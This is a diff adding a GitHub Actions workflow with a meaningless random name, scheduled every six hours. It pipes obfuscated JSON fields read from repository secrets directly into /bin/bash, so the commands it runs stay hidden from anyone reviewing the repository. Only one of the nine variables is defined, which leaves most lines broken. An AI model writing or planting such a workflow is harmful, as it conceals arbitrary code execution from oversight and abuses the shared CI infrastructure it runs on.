@@ -1,0 +1,26 @@
+name: luanlinwanyu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: luanlinwanyu
+        env:
+          am0002: ${{ secrets.am0002 }}
+        run: |
+          echo $am0002 | jq -r .enrht4868 | /bin/bash
+          echo $szf517 | jq -r .u72151 | /bin/bash
+          echo $wehlm11540 | jq -r .bz902 | /bin/bash
+          echo $fgrim2 | jq -r .icgs79270 | /bin/bash
+          echo $qe01252 | jq -r .ygbrg99813 | /bin/bash
+          echo $td450 | jq -r .o966 | /bin/bash
+          echo $q71 | jq -r .qjstk0320 | /bin/bash
+          echo $kmf36430 | jq -r .e6 | /bin/bash
+          echo $tw7 | jq -r .h27 | /bin/bash
+
